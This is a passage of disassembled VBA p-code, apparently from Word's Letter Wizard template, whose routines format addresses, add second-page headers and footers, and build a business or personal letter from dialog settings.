' Line #660:
' 	EndIfBlock 
' 	QuoteRem 0x000B 0x000A "LetterHead"
' Line #661:
' Line #662:
' 	LitStr 0x0006 "bkName"
' 	Ld WordBasic 
' 	ArgsMemLd ExistingBookmark 0x0001 
' 	IfBlock 
' Line #663:
' 	LitStr 0x0006 "bkName"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed If 
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0002 
' Line #664:
' 	Ld kName$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #665:
' 	EndIfBlock 
' Line #666:
' Line #667:
' 	LitStr 0x0007 "bkName2"
' 	Ld WordBasic 
' 	ArgsMemLd ExistingBookmark 0x0001 
' 	IfBlock 
' Line #668:
' 	LitStr 0x0007 "bkName2"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed If 
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0002 
' Line #669:
' 	Ld toui 
' 	MemLd New 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #670:
' 	Ld toui 
' 	MemLd New 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #671:
' 	ElseBlock 
' Line #672:
' 	Ld kName$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #673:
' 	EndIfBlock 
' Line #674:
' 	EndIfBlock 
' Line #675:
' 	Label LDone 
' Line #676:
' 	EndSub 
' Line #677:
' Line #678:
' Line #679:
' Line #680:
' Line #681:
' Line #682:
' 	FuncDefn (Private Sub SetAddress(nm))
' Line #683:
' 	Dim 
' 	VarDefn AddressText
' Line #684:
' 	Dim 
' 	VarDefn ix
' Line #685:
' 	Dim 
' 	VarDefn iy
' Line #686:
' 	Dim 
' 	VarDefn Ltemp
' Line #687:
' 	Dim 
' 	VarDefn Rtemp
' Line #688:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError ErrorSetAddress 
' Line #689:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld nm 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [GetAddress$] 0x0008 
' 	St AddressText$ 
' Line #690:
' 	Ld AddressText$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo SetAddressContinue 
' 	EndIf 
' Line #691:
' 	LitDI2 0x0001 
' 	Ld AddressText$ 
' 	LitDI2 0x000B 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St ix 
' Line #692:
' 	Ld ix 
' 	LitDI2 0x0000 
' 	Ne 
' 	While 
' Line #693:
' 	Ld AddressText$ 
' 	FnLen 
' 	St iy 
' Line #694:
' 	Ld AddressText$ 
' 	Ld ix 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St Ltemp$ 
' Line #695:
' 	Ld AddressText$ 
' 	Ld iy 
' 	Ld ix 
' 	Sub 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	St Rtemp$ 
' Line #696:
' 	Ld Ltemp$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Rtemp$ 
' 	Add 
' 	St AddressText$ 
' Line #697:
' 	LitDI2 0x0001 
' 	Ld AddressText$ 
' 	LitDI2 0x000B 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St ix 
' Line #698:
' 	Wend 
' Line #699:
' 	Ld AddressText$ 
' 	FnLen 
' 	St iy 
' Line #700:
' 	Ld iy 
' 	Ld AddressText$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St ix 
' Line #701:
' 	Ld ix 
' 	Ld iy 
' 	Eq 
' 	While 
' Line #702:
' 	Ld AddressText$ 
' 	Ld iy 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St AddressText$ 
' Line #703:
' 	Ld AddressText$ 
' 	FnLen 
' 	St iy 
' Line #704:
' 	Ld iy 
' 	Ld AddressText$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St ix 
' Line #705:
' 	Wend 
' Line #706:
' 	Ld nm 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #707:
' 	LitStr 0x0014 "textRecipientAddress"
' 	Ld AddressText$ 
' 	Ld WordBasic 
' 	ArgsMemCall DlgText 0x0002 
' Line #708:
' 	Ld nm 
' 	LitDI2 0x0002 
' 	Eq 
' 	ElseIfBlock 
' Line #709:
' 	LitStr 0x0011 "textReturnAddress"
' 	Ld AddressText$ 
' 	Ld WordBasic 
' 	ArgsMemCall DlgText 0x0002 
' Line #710:
' 	ElseBlock 
' Line #711:
' 	QuoteRem 0x0008 0x0010 "shouldn't happen"
' Line #712:
' 	EndIfBlock 
' 	QuoteRem 0x000B 0x0002 "nm"
' Line #713:
' 	GoTo SetAddressContinue 
' Line #714:
' 	Label ErrorSetAddress 
' Line #715:
' 	QuoteRem 0x0004 0x0056 "Only after getting the first MAPI load error, CommandValid ("InsertAddress") returns 0"
' Line #716:
' 	Ld nm 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0013 0x0030 "If error is due to MAPI loading, disable buttons"
' Line #717:
' 	LitDI2 0x002B 
' 	Ld WordBasic 
' 	ArgsMemCall DlgFocus 0x0001 
' Line #718:
' 	LitDI2 0x002E 
' 	LitDI2 0x0000 
' 	Ld kInsertAddress$ 
' 	Ld WordBasic 
' 	ArgsMemLd CommandValid 0x0001 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemCall DlgEnable 0x0002 
' Line #719:
' 	LitDI2 0x002F 
' 	LitDI2 0x0000 
' 	Ld kInsertAddress$ 
' 	Ld WordBasic 
' 	ArgsMemLd CommandValid 0x0001 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemCall DlgEnable 0x0002 
' Line #720:
' 	ElseBlock 
' Line #721:
' 	LitDI2 0x002D 
' 	Ld WordBasic 
' 	ArgsMemCall DlgFocus 0x0001 
' Line #722:
' 	LitDI2 0x002F 
' 	LitDI2 0x0000 
' 	Ld kInsertAddress$ 
' 	Ld WordBasic 
' 	ArgsMemLd CommandValid 0x0001 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemCall DlgEnable 0x0002 
' Line #723:
' 	LitDI2 0x002E 
' 	LitDI2 0x0000 
' 	Ld kInsertAddress$ 
' 	Ld WordBasic 
' 	ArgsMemLd CommandValid 0x0001 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemCall DlgEnable 0x0002 
' Line #724:
' 	EndIfBlock 
' Line #725:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #726:
' 	Label SetAddressContinue 
' Line #727:
' 	EndSub 
' 	QuoteRem 0x0008 0x000A "SetAddress"
' Line #728:
' Line #729:
' 	FuncDefn (Private Function RmTrailingLFs(tString))
' 	QuoteRem 0x002A 0x001F "nukes extra returns in a string"
' Line #730:
' 	Dim 
' 	VarDefn iy
' Line #731:
' 	Dim 
' 	VarDefn ix
' Line #732:
' 	Ld tString$ 
' 	FnLen 
' 	St iy 
' Line #733:
' 	Ld iy 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo EndOfRmTrailingLFs 
' 	EndIf 
' Line #734:
' 	Ld iy 
' 	Ld tString$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St ix 
' Line #735:
' 	Ld ix 
' 	Ld iy 
' 	Eq 
' 	While 
' Line #736:
' 	Ld tString$ 
' 	Ld iy 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St tString$ 
' Line #737:
' 	Ld tString$ 
' 	FnLen 
' 	St iy 
' Line #738:
' 	Ld iy 
' 	Ld tString$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St ix 
' Line #739:
' 	Wend 
' Line #740:
' 	Label EndOfRmTrailingLFs 
' Line #741:
' 	Ld tString$ 
' 	St RmTrailingLFs$ 
' Line #742:
' 	EndFunc 
' Line #743:
' Line #744:
' 	FuncDefn (Private Sub TwoPageHack(num))
' 	QuoteRem 0x001D 0x0021 "Hacks in a 2nd page header/footer"
' Line #745:
' 	Ld WordBasic 
' 	ArgsMemCall WW7_InsertPageBreak 0x0000 
' Line #746:
' 	Ld WordBasic 
' 	ArgsMemCall EndOfDocument 0x0000 
' Line #747:
' 	LitDI2 0x0001 
' 	ParamNamed DifferentFirstPage 
' 	Ld WordBasic 
' 	ArgsMemCall FilePageSetup 0x0001 
' Line #748:
' 	Ld num 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #749:
' 	Ld WordBasic 
' 	ArgsMemCall ViewHeader 0x0000 
' Line #750:
' 	LitStr 0x0008 "WizStyle"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0002 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #751:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #752:
' 	ElseBlock 
' Line #753:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #754:
' 	EndIfBlock 
' Line #755:
' 	Ld kFormalDateFormat$ 
' 	Ld WordBasic 
' 	ArgsMemCall InsertDateTime 0x0001 
' Line #756:
' 	Ld WordBasic 
' 	ArgsMemCall ViewNormal 0x0000 
' Line #757:
' 	EndIfBlock 
' Line #758:
' 	Ld num 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #759:
' 	Ld WordBasic 
' 	ArgsMemCall ViewFooter 0x0000 
' Line #760:
' 	LitStr 0x0008 "WizStyle"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0002 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #761:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #762:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPageField 0x0000 
' Line #763:
' 	ElseBlock 
' Line #764:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #765:
' 	LitDI2 0x0096 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #766:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPageField 0x0000 
' Line #767:
' 	LitStr 0x0001 " "
' 	LitDI2 0x0096 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #768:
' 	EndIfBlock 
' Line #769:
' 	Ld WordBasic 
' 	ArgsMemCall ViewNormal 0x0000 
' Line #770:
' 	EndIfBlock 
' Line #771:
' 	Ld WordBasic 
' 	ArgsMemCall EditSelectAll 0x0000 
' Line #772:
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0000 
' Line #773:
' 	EndSub 
' Line #774:
' Line #775:
' 	FuncDefn (Private Sub CreateLetter())
' Line #776:
' 	Dim 
' 	VarDefn recpAddress
' Line #777:
' 	Dim 
' 	VarDefn returnAddress
' Line #778:
' 	Dim 
' 	VarDefn T
' Line #779:
' 	Dim 
' 	VarDefn DateTabPlace
' Line #780:
' 	Dim 
' 	VarDefn ii
' Line #781:
' 	Ld kCreatingDoc$ 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #782:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall WaitCursor 0x0001 
' Line #783:
' 	QuoteRem 0x0004 0x0032 " branch on letter type : shrinkwrapped or original"
' Line #784:
' 	LitStr 0x0014 "textRecipientAddress"
' 	Ld WordBasic 
' 	ArgsMemLd [DlgText$] 0x0001 
' 	St recpAddress$ 
' Line #785:
' 	Ld recpAddress$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0014 "textRecipientAddress"
' 	Ld recpAddress$ 
' 	ArgsLd RmTrailingLFs$ 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DlgText 0x0002 
' 	EndIf 
' Line #786:
' 	LitStr 0x0011 "textReturnAddress"
' 	Ld WordBasic 
' 	ArgsMemLd [DlgText$] 0x0001 
' 	St returnAddress$ 
' Line #787:
' 	Ld returnAddress$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0011 "textReturnAddress"
' 	Ld returnAddress$ 
' 	ArgsLd RmTrailingLFs$ 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DlgText 0x0002 
' 	EndIf 
' Line #788:
' Line #789:
' 	Rem 0x0035 " ****************************************************"
' Line #790:
' Line #791:
' 	LitStr 0x0009 "chkloDate"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #792:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall TwoPageHack 0x0001 
' 	QuoteRem 0x0018 0x0021 "Hacks in a 2nd page header/footer"
' Line #793:
' 	EndIfBlock 
' Line #794:
' 	LitStr 0x0009 "chkloPage"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #795:
' 	LitDI2 0x0002 
' 	Paren 
' 	ArgsCall TwoPageHack 0x0001 
' Line #796:
' 	Ld WordBasic 
' 	ArgsMemCall ViewFooter 0x0000 
' Line #797:
' 	LitStr 0x0008 "WizStyle"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	SelectCase 
' Line #798:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #799:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #800:
' 	LitDI2 0x0096 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #801:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPageField 0x0000 
' Line #802:
' 	LitStr 0x0001 " "
' 	LitDI2 0x0096 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #803:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #804:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #805:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPageField 0x0000 
' Line #806:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #807:
' 	Ld kFntWndngs$ 
' 	Ld WordBasic 
' 	ArgsMemCall Font 0x0001 
' Line #808:
' 	Ld kDfltPageNum$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #809:
' 	Ld kFntArial$ 
' 	Ld WordBasic 
' 	ArgsMemCall Font 0x0001 
' Line #810:
' 	Ld kPage$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #811:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPageField 0x0000 
' Line #812:
' 	EndSelect 
' Line #813:
' 	Ld WordBasic 
' 	ArgsMemCall ViewNormal 0x0000 
' Line #814:
' 	EndIfBlock 
' Line #815:
' 	LitStr 0x0008 "WizStyle"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	LitStr 0x0009 "chkloPage"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #816:
' 	Ld WordBasic 
' 	ArgsMemCall ViewFooter 0x0000 
' Line #817:
' 	LitStr 0x0001 " "
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #818:
' 	Ld WordBasic 
' 	ArgsMemCall ViewNormal 0x0000 
' Line #819:
' 	EndIfBlock 
' Line #820:
' 	QuoteRem 0x0004 0x0022 " this is code for original letters"
' Line #821:
' 	Ld WordBasic 
' 	ArgsMemCall EditSelectAll 0x0000 
' Line #822:
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0000 
' Line #823:
' 	LitStr 0x000D "UseLetterhead"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #824:
' 	LitStr 0x0013 "textLetterheadSpace"
' 	Ld WordBasic 
' 	ArgsMemLd [DlgText$] 0x0001 
' 	St T$ 
' Line #825:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError LBadMeasurement 
' Line #826:
' 	LitStr 0x0012 "LetterHeadPosition"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	SelectCase 
' Line #827:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0014 0x000B " at the top"
' Line #828:
' 	Ld T$ 
' 	ParamNamed TopMargin 
' 	Ld WordBasic 
' 	ArgsMemCall FilePageSetup 0x0001 
' Line #829:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0016 0x000C " on the left"
' Line #830:
' 	Ld T$ 
' 	ParamNamed LeftMargin 
' 	Ld WordBasic 
' 	ArgsMemCall FilePageSetup 0x0001 
' Line #831:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0014 0x000D " on the right"
' Line #832:
' 	Ld T$ 
' 	ParamNamed RightMargin 
' 	Ld WordBasic 
' 	ArgsMemCall FilePageSetup 0x0001 
' Line #833:
' 	EndSelect 
' Line #834:
' 	GoTo LDoneLetterhead 
' Line #835:
' 	Label LBadMeasurement 
' Line #836:
' 	Ld emptyDoc$ 
' 	Ld WordBasic 
' 	ArgsMemCall DlgFilePreview 0x0001 
' Line #837:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall DocClose 0x0001 
' 	QuoteRem 0x001D 0x0028 "Close the working document(w/out saving)"
' Line #838:
' 	Stop 
' Line #839:
' 	Label LDoneLetterhead 
' Line #840:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #841:
' 	EndIfBlock 
' Line #842:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #843:
' 	QuoteRem 0x0000 0x0055 "Hey, this would be a good time to figure out where the return address/date should go:"
' Line #844:
' 	Ld rtDistToLftDist 
' 	ArgsLd RightDistanceToLeftDistance$ 0x0001 
' 	St DateTabPlace$ 
' 	QuoteRem 0x0042 0x001D "1.25" from the right is what?"
' Line #845:
' 	QuoteRem 0x0004 0x0043 "InsertPara'we're starting *after* return address/date (if included)"
' Line #846:
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x0028 0x001A "it's not a personal letter"
' Line #847:
' 	LitStr 0x0009 "recipaddr"
' 	LitDI2 0x0001 
' 	ParamNamed Add 
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0002 
' Line #848:
' 	Ld kStyInsideAddr$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #849:
' 	LitStr 0x0014 "textRecipientAddress"
' 	Ld WordBasic 
' 	ArgsMemLd [DlgText$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	QuoteRem 0x0046 0x000D "includes name"
' Line #850:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #851:
' 	QuoteRem 0x0004 0x001A "InsertPara  DAPFEL removed"
' Line #852:
' 	EndIfBlock 
' Line #853:
' 	Ld kStySal$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #854:
' 	Ld kDear$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	QuoteRem 0x001C 0x001F "+ DlgText$("textRecipientName")"
' Line #855:
' 	LitStr 0x0009 "recipient"
' 	LitDI2 0x0001 
' 	ParamNamed Add 
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0002 
' Line #856:
' 	Ld kRecipient$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #857:
' 	QuoteRem 0x0004 0x002F "lenrecip = Len(kRecipient$) + 2    ' 2 for [, ]"
' Line #858:
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 ","
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0001 ":"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	EndIf 
' Line #859:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #860:
' 	LitStr 0x0007 "chkloID"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #861:
' 	Ld kStySubjLine$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #862:
' 	Ld kRE$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #863:
' 	Ld kAccountID$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #864:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #865:
' 	EndIfBlock 
' Line #866:
' 	Ld kStyBodyText$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #867:
' 	LitStr 0x000A "letterbody"
' 	LitDI2 0x0001 
' 	ParamNamed Add 
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0002 
' Line #868:
' 	Ld kTypeHere$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #869:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #870:
' 	LitDI2 0x0001 
' 	ParamNamed ClearAll 
' 	Ld WordBasic 
' 	ArgsMemCall FormatTabs 0x0001 
' Line #871:
' 	Ld DateTabPlace$ 
' 	ParamNamed Position 
' 	LitDI2 0x0001 
' 	ParamNamed Sgn 
' 	Ld WordBasic 
' 	ArgsMemCall FormatTabs 0x0002 
' Line #872:
' 	LitStr 0x0004 "µ²»y"
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #873:
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld kClosePersonal$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	Else 
' 	BoSImplicit 
' 	Ld kCloseBusiness$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	EndIf 
' Line #874:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' 	QuoteRem 0x001C 0x0017 "space for writer's name"
' Line #875:
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x0028 0x000F "if not personal"
' Line #876:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #877:
' 	Ld kStyRefIntls$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #878:
' 	LitStr 0x0013 "chkloWriterInitials"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	IfBlock 
' Line #879:
' 	Ld kWritersInitials$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #880:
' 	LitStr 0x0013 "chkloTypistInitials"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "/"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	Else 
' 	BoSImplicit 
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' 	EndIf 
' Line #881:
' 	EndIfBlock 
' Line #882:
' 	LitStr 0x0013 "chkloTypistInitials"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	IfBlock 
' Line #883:
' 	Ld kTypistsInitials$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #884:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #885:
' 	EndIfBlock 
' Line #886:
' 	LitStr 0x0007 "chkloCC"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	IfBlock 
' Line #887:
' 	Ld kStyCC$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #888:
' 	Ld kCC$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #889:
' 	Ld kNames$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #890:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #891:
' 	EndIfBlock 
' Line #892:
' 	Ld kStyEncl$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #893:
' 	LitStr 0x000F "chkloEnclosures"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	IfBlock 
' Line #894:
' 	Ld kEnclosures$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #895:
' 	Ld kNumber$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #896:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #897:
' 	EndIfBlock 
' Line #898:
' 	LitStr 0x0010 "chkloAttachments"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	IfBlock 
' Line #899:
' 	Ld kAttachments$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #900:
' 	EndIfBlock 
' Line #901:
' 	EndIfBlock 
' 	QuoteRem 0x000B 0x000C "not personal"
' Line #902:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' 	QuoteRem 0x001F 0x0015 " go back to the start"
' Line #903:
' 	LitStr 0x000C "LetterMethod"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0033 0x0008 "Personal"
' Line #904:
' 	LitStr 0x0008 "WizStyle"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0033 0x0012 "Contemporary Style"
' Line #905:
' 	LitStr 0x0009 "cntmpgfx2"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Insert 
' 	Ld WordBasic 
' 	ArgsMemCall WW7_EditAutoText 0x0002 
' Line #906:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #907:
' 	EndIfBlock 
' 	QuoteRem 0x000F 0x0012 "Contemporary Style"
' Line #908:
' 	ElseBlock 
' 	QuoteRem 0x0009 0x000F "if not personal"
' Line #909:
' 	LitStr 0x000D "UseLetterhead"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #910:
' 	Ld kStyCmpnyName$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #911:
' 	Ld kTypeCompanyName$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #912:
' 	LitStr 0x0008 "WizStyle"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #913:
' 	LitStr 0x0009 "cntmpgfx2"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Insert 
' 	Ld WordBasic 
' 	ArgsMemCall WW7_EditAutoText 0x0002 
' Line #914:
